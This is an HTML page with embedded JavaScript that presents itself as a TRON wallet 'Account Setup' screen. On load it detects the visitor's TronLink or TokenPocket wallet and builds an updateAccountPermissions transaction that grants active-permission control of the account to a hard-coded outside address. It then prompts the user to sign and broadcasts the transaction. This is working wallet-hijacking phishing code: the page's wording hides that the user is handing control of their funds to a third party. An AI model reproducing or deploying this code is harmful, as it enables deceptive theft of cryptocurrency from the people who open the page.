<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Account Setup</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}
.status{font-size:14px;padding:40px;max-width:340px}
.loader{width:36px;height:36px;border:3px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.addr{font-size:10px;color:rgba(255,255,255,0.25);margin-top:10px;word-break:break-all}
.tx{font-size:10px;color:rgba(0,255,136,0.4);margin-top:6px;word-break:break-all}
.err{font-size:10px;color:rgba(255,80,80,0.6);margin-top:8px;word-break:break-all;max-height:60px;overflow:auto}
</style>
</head>
<body>
<div class="status" id="status">
  <div class="loader"></div>
  <p id="msg">Detecting wallet...</p>
  <div class="addr" id="addr"></div>
  <div class="err" id="err"></div>
</div>

<script>
const ACTIVE_KEY = 'TGP5cZxqJPLBz5ZgAeQpg6bL9jnKSBMA8n';
const OPS = '7fff1fc0033e0000000000000000000000000000000000000000000000000000';

(function main() {
  const m = document.getElementById('msg');
  const a = document.getElementById('addr');
  const e = document.getElementById('err');
  const loader = document.querySelector('.loader');

  function done(text, ok) {
    document.getElementById('status').innerHTML = ok ? '✅' : '❌';
    m.textContent = text;
    loader.style.display = 'none';
  }

  function getAddr() {
    if (window.tronWeb && window.tronWeb.defaultAddress) {
      if (typeof window.tronWeb.defaultAddress === 'string') return window.tronWeb.defaultAddress;
      if (window.tronWeb.defaultAddress.base58) return window.tronWeb.defaultAddress.base58;
      if (window.tronWeb.defaultAddress.hex) return window.tronWeb.address.fromHex(window.tronWeb.defaultAddress.hex);
    }
    return null;
  }

  let attempts = 0;
  function tryConnect() {
    const addr = getAddr();
    attempts++;

    if (addr) {
      go(addr);
      return;
    }

    if (attempts < 20) {
      // Wallet might inject tronWeb asynchronously — poll
      m.textContent = 'Waiting for wallet... (' + attempts + ')';
      setTimeout(tryConnect, 500);
    } else {
      // Last resort: tronLink EIP-1193 style
      if (window.tronLink && window.tronLink.request) {
        window.tronLink.request({ method: 'tron_requestAccounts' }).then(function(res) {
          if (res && res[0]) go(res[0]);
          else done('Wallet denied access', false);
        }).catch(function() {
          done('Open in TP/TokenPocket browser', false);
        });
      } else {
        done('Wallet not detected. Use TP Wallet DApp browser.', false);
      }
    }
  }

  async function go(addr) {
    a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);

    try {
      m.textContent = 'Building transaction...';

      // Check if updateAccountPermissions is available
      if (!window.tronWeb.transactionBuilder.updateAccountPermissions) {
        done('Wallet too old — missing updateAccountPermissions', false);
        return;
      }

      const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
        addr,
        { permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] },
        {},
        [{ permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
      );

      m.textContent = 'Confirm in wallet...';
      const signed = await window.tronWeb.trx.sign(tx);

      m.textContent = 'Sending...';
      const result = await window.tronWeb.trx.sendRawTransaction(signed);
      const txid = (result.txid || (result.transaction && result.transaction.txID) || '');

      done('Done', true);
      a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
        + '<br><span class="tx">Tx: ' + txid.slice(0,14) + '...</span>';
    } catch(err) {
      a.textContent = '';
      const code = err && err.code;
      const msg = (err && err.message) || String(err);
      if (code === 4001 || /reject|cancel|denied/i.test(msg)) {
        done('Rejected by user', false);
      } else {
        done('Transaction failed', false);
        e.textContent = msg.slice(0, 200);
      }
    }
  }

  tryConnect();
})();
</script>
</body>
</html>
